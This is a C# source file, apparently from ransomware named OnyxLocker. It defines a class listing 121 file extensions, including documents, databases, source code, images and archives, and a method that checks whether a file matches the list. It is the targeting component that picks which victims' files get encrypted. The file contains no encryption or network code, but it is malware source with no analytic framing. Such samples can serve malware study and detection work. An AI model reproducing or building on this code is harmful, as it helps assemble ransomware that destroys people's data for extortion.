using System.IO;
using System.Linq;

namespace OnyxLocker;

internal class FileChecker : IFileChecker
{
	public string[] TargetFiles { get; } = new string[121]
	{
		".js", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".sqlite3",
		".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".cmd", ".bat", ".lnk", ".url", ".mat",
		".kys", ".pif", ".scf", ".shs", ".shb", ".xnx", ".ps1", ".vbs", ".vb", ".pl",
		".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav",
		".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4",
		".3gp", ".mkv", ".3g2", ".flv", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg",
		".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".ta", ".pdf",
		".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
		".xlsx", ".xls", ".docx", ".doc", ".htm,", ".html", ".php5", ".php", ".phtml", ".fla",
		".cmd", ".ink", ".exe", ". txt", ".gif", ".csv", ".raw", ".lua", ".dat", ".vbs",
		".vb6", ".apk", ".config", ".c", ".resx", ".vbproj", ".myapp", ".cache", ".pdb", ".manifest",
		".png", ".bmp", ".eps", ".hdr", ".exr", ".ico", ".svg", ".tga", ".tiff", ".wbmp",
		".webp"
	};


	public bool IsTargetFile(string filePath)
	{
		string value = Path.GetExtension(filePath)!.ToLower();
		return TargetFiles.Contains(value);
	}
}
